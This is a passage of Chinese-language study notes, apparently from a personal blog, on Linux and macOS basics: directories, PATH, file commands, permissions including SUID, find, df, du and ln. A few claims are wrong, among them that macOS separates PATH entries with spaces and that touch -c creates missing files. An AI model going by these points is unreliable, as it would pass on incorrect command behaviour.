&#x2F;etc等链接目录的目标目录</td></tr><tr><td>&#x2F;Volumes</td><td>文件系统挂载点存放目录</td></tr><tr><td>&#x2F;Library</td><td>中文下为”资源库”，存放系统的数据文件、帮助文件、文档等等</td></tr><tr><td>&#x2F;Users</td><td>存放用户的个人资料和配置。每个用户有自己的单独目录，除此外还有个shared目录</td></tr><tr><td>&#x2F;System</td><td>中存放了系统的绝大部分组件，如各种framework，以及内核模块，字体文件等等，我们会发现子目录中也有一个Applications，里面存放系统自带GUI应用程序</td></tr></tbody></table><blockquote><p>mac下的<code>~</code>是当前用户的顶级目录，指向<code>/User/当前用户名</code>目录</p></blockquote><h4 id="x2F-usr-x2F-local与-x2F-opt"><a href="#x2F-usr-x2F-local与-x2F-opt" class="headerlink" title="&#x2F;usr&#x2F;local与&#x2F;opt"></a>&#x2F;usr&#x2F;local与&#x2F;opt</h4><p><code>homebrew</code>是mac下强大的软件包工具(类似于apt-get)，可以轻松安装终端命令、服务(例如Mysql数据库)、甚至GUI应用程序等等。而通过命令行安装的homebrew默认放在&#x2F;opt下，通过homebrew安装的命令或服务都存放在其子目录Cellar下。而当你去官网中下载对应的pkg安装包安装各种服务时，这些服务默认放在&#x2F;usr&#x2F;local下</p><blockquote><p>因此观看博客时需要辨别其中本地已有服务的真实位置，可能大多数教程的mysql是使用homebrew安装，因此它的路径一般为<code>/opt/homebrew/Cellar/mysql</code>，但若你是官网安装的mysql，路径则为<code>/usr/local/mysql</code> </p><h4 id="💡homebrew的一个使用技巧："><a href="#💡homebrew的一个使用技巧：" class="headerlink" title="💡homebrew的一个使用技巧："></a>💡homebrew的一个使用技巧：</h4><p>在<code>/opt/homebrew/Library/Taps/homebrew/homebrew-core/Formula</code>目录下存储了许多.rb文件，对应着可通过homebrew安装的工具或服务，而为了更轻便，homebrew常将一个大型工具的不常用模块或驱动打包独立出来，以qt为例，执行<code>brew install qt</code>安装的仅是最基础版本，若需要连接mysql的服务要执行<code>brew install qt-mysql</code>，而这些往往不会写在官方文档中，因此我们要学习善用Formula目录，通过查找关键词，找到需要的服务，可以节省很多环境配置的时间</p></blockquote><h2 id="0x03-目录与路径"><a href="#0x03-目录与路径" class="headerlink" title="0x03 目录与路径"></a>0x03 目录与路径</h2><h3 id="相对路径与绝对路径"><a href="#相对路径与绝对路径" class="headerlink" title="相对路径与绝对路径"></a>相对路径与绝对路径</h3><p>相对路径：利用.、..等特殊目录描述相对于当前目录的文件路径 e.g. <code>../test.txt</code></p><p>绝对路径：从根目录&#x2F;开始写起  e.g. <code>/Users/sloth/install.sh</code></p><h3 id="目录相关操作"><a href="#目录相关操作" class="headerlink" title="目录相关操作"></a>目录相关操作</h3><h4 id="特殊目录"><a href="#特殊目录" class="headerlink" title="特殊目录"></a>特殊目录</h4><ul><li><code>.</code> –当前目录 </li><li><code>..</code> –上一级目录</li><li><code>-</code> –前一个目录(<code>cd -</code>同时还会回显上一个目录的路径(从~或根目录&#x2F;开始的绝对路径))</li><li><code>~</code> –当前用户主文件夹</li><li><code>~example</code> –example用户主文件夹</li></ul><h4 id="处理目录的命令"><a href="#处理目录的命令" class="headerlink" title="处理目录的命令"></a>处理目录的命令</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd 目录的绝对路径/相对路径 # 切换目录 change directory<br>pwd [-P] # 显示当前目录 -P:显示实际目录(原身)，而不是连接文件(替身)<br>mkdir [-m 权限][-p] # 新建目录 -m:配置权限  -p:创建多层目录<br>rmdir [-p] # 删除一个空目录(删除非空目录会报错)  -p:一次性删除多层空目录 <br></code></pre></td></tr></table></figure><h3 id="环境变量-PATH"><a href="#环境变量-PATH" class="headerlink" title="环境变量$PATH"></a>环境变量$PATH</h3><p>$PATH的值一般是多个目录下的集合，当前用户可以执行这些目录存储的命令，Linux下这些目录以<code>:</code>分隔，而mac下以空格分隔</p><h4 id="执行非环境变量中的命令"><a href="#执行非环境变量中的命令" class="headerlink" title="执行非环境变量中的命令"></a>执行非环境变量中的命令</h4><p>可以采用命令的绝对路径来执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/sbin/ifconfig eth0<br></code></pre></td></tr></table></figure><p>采用命令添加</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">PATH=&quot;$PATH&quot;:命令路径    # 一般是一个bin文件目录<br></code></pre></td></tr></table></figure><p>配置文件添加，mac下也有许多环境变量相关配置文件,可以添加语句</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">export PATH=$PATH:命令路径<br></code></pre></td></tr></table></figure><blockquote><p>使用前记得执行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">source 配置文件名路径<br></code></pre></td></tr></table></figure><p>注：如果有两个相同名字的命令存在PATH中，则执行PATH先查询到的目录下的命令</p></blockquote><h2 id="0x04-文件与目录管理"><a href="#0x04-文件与目录管理" class="headerlink" title="0x04 文件与目录管理"></a>0x04 文件与目录管理</h2><h3 id="常见文件-x2F-目录操作命令"><a href="#常见文件-x2F-目录操作命令" class="headerlink" title="常见文件&#x2F;目录操作命令"></a>常见文件&#x2F;目录操作命令</h3><h4 id="ls命令–查看文件与目录"><a href="#ls命令–查看文件与目录" class="headerlink" title="ls命令–查看文件与目录"></a>ls命令–查看文件与目录</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">ls [options] 目录名称<br><span class="hljs-meta prompt_"># </span><span class="language-bash">常用option</span><br>-a  显示全部包括隐藏文件(还显示.与..)<br>-d  仅列出目录本身(.)一般要搭配其他option一起使用<br>-l  打印表示文件属性、权限的字符串<br>-A  同-a ，但不列出 &quot;.&quot; 及 &quot;..&quot;<br>-F  在列出的文件名称后加一符号标识 例如可执行档则加 &quot;*&quot;, 目录则加 &quot;/&quot;, sockert加&quot;=&quot;,FIFO文件加&quot;|&quot;<br>-R  连同子目录下文件依序列出<br>-r  将文件以相反次序显示(原定依英文字母次序)<br>-t  将文件依建立时间之先后次序列出<br>-n  列出UID与GID<br></code></pre></td></tr></table></figure><h4 id="cp命令–复制"><a href="#cp命令–复制" class="headerlink" title="cp命令–复制"></a>cp命令–复制</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp [options] source1 source2 …… destination<br><span class="hljs-meta prompt_"># </span><span class="language-bash">常用参数</span><br>-d  若源文件为连接文件，则复制连接属性<br>-p  连同文件的属性一起复制过去，而非使用默认属性(备份常用)<br>-r  递归持续复制<br>-a  相当于上面提到的三个options一起用(-pdr)<br>-i  若目标文件已经存在时，在覆盖时会先询问动作的进行<br>-u  用于更新，若destination比source旧才升级destination<br>-f  为强制(force)的意思，若目标文件已经存在且无法开启，则移除后再尝试一次<br>-l  建立硬连接<br>-s  复制为符号连接文件 软连接<br></code></pre></td></tr></table></figure><blockquote><p>source有两个及以上时，目标文件必须是目录</p></blockquote><h4 id="rm命令–移除"><a href="#rm命令–移除" class="headerlink" title="rm命令–移除"></a>rm命令–移除</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm [options] 文件或目录<br><span class="hljs-meta prompt_">#</span><span class="language-bash">常用options</span><br>-f  强制移除，忽略不存在文件，不出现警告<br>-i  互动模式，删除前询问<br>-r  递归删除<br></code></pre></td></tr></table></figure><blockquote><ul><li>删除文件名以<code>-</code>开头文件，由于直接删除会被系统误判为option，因此只要加上<code>./</code></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm ./-example<br><span class="hljs-meta prompt_"># </span><span class="language-bash">或</span><br>rm -- -example<br></code></pre></td></tr></table></figure><ul><li><p>没有options时，直接rm是无法删除目录的,一定要-r</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">rm -r 目录<br></code></pre></td></tr></table></figure></li></ul></blockquote><h4 id="mv命令–移动或更名"><a href="#mv命令–移动或更名" class="headerlink" title="mv命令–移动或更名"></a>mv命令–移动或更名</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv [options] source1 source2 …… destination<br><span class="hljs-meta prompt_"># </span><span class="language-bash">参数</span><br>-f  不询问直接覆盖<br>-i  覆盖前询问<br>-u  更新，source比destination新才会更新<br><span class="hljs-meta prompt_">#</span><span class="language-bash">重命名操作</span><br>mv old_name new_name   # 处于同一目录下<br></code></pre></td></tr></table></figure><blockquote><p>mv移动默认删除原文件</p></blockquote><h4 id="利用以上命令实现文件移动新目录，不删除原文件"><a href="#利用以上命令实现文件移动新目录，不删除原文件" class="headerlink" title="利用以上命令实现文件移动新目录，不删除原文件"></a>利用以上命令实现文件移动新目录，不删除原文件</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp source1 source1_1<br>cd 新路径<br>mkdir 新目录<br>mv source1_1完整路径 新目录<br></code></pre></td></tr></table></figure><h4 id="basename与dirname"><a href="#basename与dirname" class="headerlink" title="basename与dirname"></a>basename与dirname</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">basename 路径  # 返回文件名<br>dirname 路径   # 返回目录名<br></code></pre></td></tr></table></figure><h3 id="文件内容查阅命令"><a href="#文件内容查阅命令" class="headerlink" title="文件内容查阅命令"></a>文件内容查阅命令</h3><ul><li>cat ：从第一行开始</li><li>tac ：从最后一话开始</li><li>nl：显示时列出行号</li><li>more：一页页显示</li><li>less：与more类似，但可以往前翻</li><li>head：只看头几行</li><li>tail：只看结尾几行</li><li>od：二进制方式读取</li></ul><h3 id="修改文件时间或创建文件–touch"><a href="#修改文件时间或创建文件–touch" class="headerlink" title="修改文件时间或创建文件–touch"></a>修改文件时间或创建文件–touch</h3><h4 id="三个变动时间"><a href="#三个变动时间" class="headerlink" title="三个变动时间"></a>三个变动时间</h4><ul><li>mtime :文件内容数据(不包括属性、权限)更改时更新</li><li>ctime :文件状态(属性权限等)改变时更新(cp时无法复制的属性)</li><li>atime :文件内容被取用时(如用cat读取)时更新</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">touch [options] 文件<br>-a  仅修改访问时间<br>-c  仅修改文件时间，若文件不存在则新建<br>-d  后接日期(不同于当前)，同 --date=&quot;日期或时间&quot;<br>-m  仅修改mtime<br>-t  后接时间(不同于当前)，格式为[YYMMDDhhmm]<br></code></pre></td></tr></table></figure><blockquote><p>可以通过<code>touch+文件名</code>在当前目录下新建一个文件，注意与mkdir区分(新建目录)</p><p>也可以通过<code>touch+文件名</code>将文件时间(mtime、atime)修改到现在</p></blockquote><h2 id="0x05-文件与目录的默认权限与隐藏权限"><a href="#0x05-文件与目录的默认权限与隐藏权限" class="headerlink" title="0x05 文件与目录的默认权限与隐藏权限"></a>0x05 文件与目录的默认权限与隐藏权限</h2><h3 id="文件默认权限：umask"><a href="#文件默认权限：umask" class="headerlink" title="文件默认权限：umask"></a>文件默认权限：umask</h3><p>Linux下输入会返回4个数字，与权限相关的是后三个，而mac下只返回后三个数字，而两者返回的代表权限的数字都等于<code>默认值-权限分数</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">umask   #在～下执行,加-S会以字母形式回显 u=rwx,g=rx,o=rx<br>022     #回显 Linux下是0022<br>cd /<br>ls -al | grep sloth<br>drwxr-xr-x   5 sloth  wheel   160 May  9 18:51 opt # 回显 可见权限分数是755<br></code></pre></td></tr></table></figure><h4 id="两种默认值"><a href="#两种默认值" class="headerlink" title="两种默认值"></a>两种默认值</h4><ul><li>新建文件时，默认值(rw-rw-rw-)为666，默认没有可执行权限,因此新建的文件权限分数为<code>666-022=644</code> <code>022</code>为umask，可设置</li><li>新建目录时，默认值(rwxrwxrwx)为777，因为x权限与进入此目录有关，因此新建的目录权限分数为<code>777-022=755</code></li></ul><h3 id="文件隐藏属性"><a href="#文件隐藏属性" class="headerlink" title="文件隐藏属性"></a>文件隐藏属性</h3><p>设置</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell">chattr [+-=][ASacdistu] 文件或目录<br>A  设置后访问文件或目录后，atime不改变<br>S  设置后所有改动同步写入磁盘<br>a  设置后只能增加数据，root才能设置(常用)<br>c  设置后自动压缩<br>d  设置后改文件或目录不会被dump备份<br>i  设置后该文件不能被删除、改名、无法写入添加数据，只有root可以设置(常用)<br>s  设置后若被删除，会被完全从磁盘空间中删除<br>u  与s相反，若被删除还会保留在磁盘中，可找回<br></code></pre></td></tr></table></figure><p>显示</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell">lsattr [-adR] 文件或目录<br>-a  隐藏文件的属性也显示<br>-d  若操作目录，仅列出目录本身属性，不递归<br>-R  递归<br></code></pre></td></tr></table></figure><h3 id="文件特殊权限"><a href="#文件特殊权限" class="headerlink" title="文件特殊权限"></a>文件特殊权限</h3><h4 id="SUID"><a href="#SUID" class="headerlink" title="SUID"></a>SUID</h4><p>当s出现在user权限的x位置上，e.g. -rwsr-xr-x</p><ul><li>针对文件</li><li>仅对二进制程序有效</li><li>执行者对于该程序要有x权限</li><li>执行者在执行程序过程中<u>暂时</u>具有user的权限</li></ul><h4 id="SGID"><a href="#SGID" class="headerlink" title="SGID"></a>SGID</h4><p>s出现在group权限的x位置上</p><ul><li>针对文件或目录</li><li>对二进制程序有用</li><li>执行者对于该程序要有x权限</li><li>执行者在执行程序过程中<u>暂时</u>具有group的权限</li></ul><h4 id="SBIT"><a href="#SBIT" class="headerlink" title="SBIT"></a>SBIT</h4><ul><li>仅针对目录</li><li>用户在该目录下创建文件或目录时，只有自己与root才有权删除该文件，也无法改动他人文件</li></ul><h4 id="特殊权限的设置"><a href="#特殊权限的设置" class="headerlink" title="特殊权限的设置"></a>特殊权限的设置</h4><p>前面所提的权限分数都是三位数字，我们可以在设置权限分数时在开头加上代表特殊权限的第四位数字(特殊权限可叠加)</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell">4  SUID<br>2  SGID<br>1  SBIT<br>chmod 4775 test1 #加上SUID<br><span class="hljs-meta prompt_"># </span><span class="language-bash">drwsrwxr-x</span><br>chmod 7666 test2 #加上三种<br><span class="hljs-meta prompt_"># </span><span class="language-bash">drwSrwSrwT</span><br>chmod 4666 test3 <br><span class="hljs-meta prompt_"># </span><span class="language-bash">drwSrw-rw-</span><br>chmod 6666 test4<br><span class="hljs-meta prompt_"># </span><span class="language-bash">drwSrwSrw-</span><br>chmod 1666 test5<br><span class="hljs-meta prompt_"># </span><span class="language-bash">drw-rw-rwT</span><br>chmod 1766 test5<br><span class="hljs-meta prompt_"># </span><span class="language-bash">drwxrw-rwT</span><br><span class="hljs-meta prompt_"># </span><span class="language-bash">符号法</span><br>u+s #SUID<br>g+s #SGID<br>o+t #SBIT<br></code></pre></td></tr></table></figure><blockquote><p>从上面的案例可以看出，当user没有x时加上SUID会用S填充表示空，同理当group权限没有x时加SGID会用S填充表示空，而SBIT在others没有x时以T填充表示空</p></blockquote><h3 id="查看文件类型-file"><a href="#查看文件类型-file" class="headerlink" title="查看文件类型:file"></a>查看文件类型:file</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">file 文件或目录路径<br><span class="hljs-meta prompt_"># </span><span class="language-bash">回显</span><br>路径:格式类型信息(包括有没有使用到动态函数库等信息)  (这里的路径取决于你输入命令中的路径，不一定是绝对路径)<br></code></pre></td></tr></table></figure><h2 id="0x06-命令与文件的查询"><a href="#0x06-命令与文件的查询" class="headerlink" title="0x06 命令与文件的查询"></a>0x06 命令与文件的查询</h2><h3 id="脚本文件名查询"><a href="#脚本文件名查询" class="headerlink" title="脚本文件名查询"></a>脚本文件名查询</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">which [-a] command<br>-a:列出所有同名命令<br></code></pre></td></tr></table></figure><h3 id="文件名查找"><a href="#文件名查找" class="headerlink" title="文件名查找"></a>文件名查找</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">whereis [options] 文件或目录名<br>-b:只找二进制文件<br>-m:只找在说明文件manual路径下的文件<br>-s:只找source源文件<br>-u:除以上三种外的其他特殊文件<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">locate [options] keyword<br>-i:忽略大小写差异<br>-r:后面可接正则<br></code></pre></td></tr></table></figure><h4 id="find命令–磁盘中查找，时间较长，功能强大"><a href="#find命令–磁盘中查找，时间较长，功能强大" class="headerlink" title="find命令–磁盘中查找，时间较长，功能强大"></a>find命令–磁盘中查找，时间较长，功能强大</h4><p><a href="https://wangchujiang.com/linux-command/c/find.html">https://wangchujiang.com/linux-command/c/find.html</a></p><p>时间相关参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">find [PATH] [option] [action]<br><span class="hljs-meta prompt_"># </span><span class="language-bash">可加与时间相关参数，下面以-mtime为例</span><br>-mtime n : n天之前的“一天内”被更改文件<br>-mtime +n : n天之前(不含n本身，包括往前所有时间)被更改文件<br>-mtime -n : n天之内(含n本身)被更改文件<br>-newer 文件: 列出比该文件更新的文件<br><span class="hljs-meta prompt_">#</span><span class="language-bash">列出过去24小时内被修改文件</span><br>find / -mtime 0<br></code></pre></td></tr></table></figure><p>用户、用户组相关参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">-uid n <br>-gid n<br>-user name<br>-group name<br>-nouser   :找出文件所有者不在/etc/passwd中的<br>-nogroup  :找出文件所有用户组不在/etc/passwd中的<br></code></pre></td></tr></table></figure><blockquote><p>找到不属于系统任何人的文件，可能是曾经下载用于编译软件的源码</p></blockquote><p>文件权限、名称相关参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell">-name filename<br>-size [+-]SIZE :找比SIZE大(+)或小(-)的,c表示byte，k表示KB，e.g. -size +50k<br>-type TYPE: 正规文件(f)、设备文件(b,c)、目录(d)、连接文件(l)、socket(s)、FIFO(p)等<br>-perm 权限分数<br>-perm -mode :找出权限分数比mode大的文件   e.g. -perm -0744<br>-perm +mode :找出权限中包含任一mode权限的<br></code></pre></td></tr></table></figure><p>其他参数</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">-exec command &#123;&#125;\;  :后接command处理查询结果，但不支持命令别名alias<br>-print : 打印，这是默认操作<br><span class="hljs-meta prompt_">#</span><span class="language-bash">范例</span><br>find / -perm +7000 -exec ls -l &#123;&#125;\;<br><span class="hljs-meta prompt_">#</span><span class="language-bash">将含有隐藏权限的文件找出并以<span class="hljs-built_in">ls</span> -l方式列出来</span><br></code></pre></td></tr></table></figure><blockquote><p>find的结果被放入’{}’中，命令以’;‘为结束标志,因为’;’在bash下有特殊意义要转义</p></blockquote><h2 id="0x07-权限与命令间关系"><a href="#0x07-权限与命令间关系" class="headerlink" title="0x07 权限与命令间关系"></a>0x07 权限与命令间关系</h2><h3 id="用户可进入目录成为可工作目录"><a href="#用户可进入目录成为可工作目录" class="headerlink" title="用户可进入目录成为可工作目录"></a>用户可进入目录成为可工作目录</h3><ul><li>可使用命令：cd等切换工作目录</li><li>目录所需权限：至少是x</li><li>额外需求：若想执行ls查阅目录内文件名，对目录还要r权限</li></ul><h3 id="用户读取目录内内某一文件"><a href="#用户读取目录内内某一文件" class="headerlink" title="用户读取目录内内某一文件"></a>用户读取目录内内某一文件</h3><ul><li>可使用命令：cat、more、less等</li><li>目录所需权限：至少是x</li><li>文件所需权限：至少是r</li></ul><h3 id="用户修改某一文件"><a href="#用户修改某一文件" class="headerlink" title="用户修改某一文件"></a>用户修改某一文件</h3><ul><li>目录所需权限：至少是x</li><li>文件所需权限：至少是r、w</li></ul><h3 id="用户创建一个文件"><a href="#用户创建一个文件" class="headerlink" title="用户创建一个文件"></a>用户创建一个文件</h3><ul><li>目录所需：至少是w、x</li></ul><h4 id="用户进入某目录并执行该目录下某命令"><a href="#用户进入某目录并执行该目录下某命令" class="headerlink" title="用户进入某目录并执行该目录下某命令"></a>用户进入某目录并执行该目录下某命令</h4><ul><li>目录所需权限：至少是x</li><li>文件所需权限：至少是x</li></ul><h3 id="范例"><a href="#范例" class="headerlink" title="范例"></a>范例</h3><p>用户能执行以下命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cp /dir1/file1  /dir2<br></code></pre></td></tr></table></figure><ul><li>dir1目录:至少有x</li><li>file1文件:至少有r</li><li>dir2目录:至少有w、x</li></ul><h1 id="文件系统的简单操作"><a href="#文件系统的简单操作" class="headerlink" title="文件系统的简单操作"></a>文件系统的简单操作</h1><h2 id="查看磁盘与目录的容量"><a href="#查看磁盘与目录的容量" class="headerlink" title="查看磁盘与目录的容量"></a>查看磁盘与目录的容量</h2><h3 id="df"><a href="#df" class="headerlink" title="df"></a>df</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs shell">df [options] [目录名/文件名]<br>-a: 列出所有，包括特有的/proc<br>-k: 以KB单位显示<br>-m: 以MB单位<br>-h: 自动加上单位(如显示12K)<br>-H: 使用M=1000K的换算<br>-T: 连同该分区的文件系统名称也列出<br>-i: 以inode数量显示<br></code></pre></td></tr></table></figure><blockquote><ul><li>inode:一个文件占用一个inode，inode记录文件的属性,也记录此文件的数据所在的block号码</li><li>block:记录文件内容，若文件太大，会占用多个block</li><li>super block: 记录此文件系统的整体信息</li></ul></blockquote><h3 id="du"><a href="#du" class="headerlink" title="du"></a>du</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">du [options] 文件或目录名<br>-a: 所有<br>-h: 自动加上单位<br>-s: 列出总量<br>-S: 列出总量，但不包括子目录<br>-k: kb<br>-m: mb<br></code></pre></td></tr></table></figure><h2 id="连接文件"><a href="#连接文件" class="headerlink" title="连接文件"></a>连接文件</h2><h3 id="ln"><a href="#ln" class="headerlink" title="ln"></a>ln</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">ln [options] 源文件 目标文件<br>-s: 不加-s就是硬连接，加-s就是symbolic link<br>-f: 如果目标文件存在，主动将目标文件直接删除任何再创建<br></code></pre></td></tr></table></figure><blockquote><ul><li><p>硬连接：使得两个文件连接到同一个inode,二者除文件名以外一摸一样</p><ul><li>不能跨文件系统、不能连接到目录</li></ul></li><li><p>symbolic link: 符号连接，快捷方式</p><ul><li>删除源文件，会导致目标文件打开不了</li></ul></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> foundation </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
